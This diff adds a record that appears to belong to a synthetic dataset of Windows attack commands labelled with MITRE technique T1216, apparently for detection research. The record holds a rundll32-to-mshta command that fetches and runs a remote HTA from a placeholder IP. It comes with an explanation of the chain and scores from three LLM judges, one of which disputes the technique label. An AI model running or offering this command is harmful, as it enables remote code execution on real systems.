@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "rundll32.exe shell32.dll,ShellExec_RunDLL mshta.exe http://198.51.100.22/update.hta",
+  "explanation": "Uses rundll32 to call ShellExec_RunDLL as a proxy to launch mshta with a remote HTA, chaining trusted components to execute external content.",
+  "rationale_steps": [
+    "PowerShell starts rundll32 with ShellExec_RunDLL export from shell32.dll.",
+    "ShellExec_RunDLL spawns mshta pointing to a remote HTA for execution.",
+    "The chain relies on signed Windows binaries; unusual pairing of ShellExec_RunDLL with mshta and remote URLs is the detection point."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-c35b6d49",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed rundll32 invocation with valid arguments and no quoting or parsing issues for PowerShell/CMD.",
+        "semantic_score": 3,
+        "semantic_justification": "While it plausibly proxies execution to mshta to run a remote HTA, this aligns more with Signed Binary Proxy Execution (T1218, mshta/rundll32) than System Script Proxy Execution (T1216), and the URL uses a documentation-only IP.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T21:24:18.033725Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax for rundll32.exe, correct parameter passing to shell32.dll,ShellExec_RunDLL, and a valid URL format for the remote HTA file.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1216 (System Script Proxy Execution) by using rundll32.exe as a trusted Windows binary to proxy the execution of mshta.exe, which then loads and executes potentially malicious code from a remote HTA file.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T03:55:14.525788Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses valid executables and DLL entry points, and has no syntax errors or unbalanced characters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1216 by using `rundll32.exe` as a proxy to launch `mshta.exe`, which then executes remote HTA content, leveraging multiple trusted components to achieve external script execution.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T03:55:19.833405Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
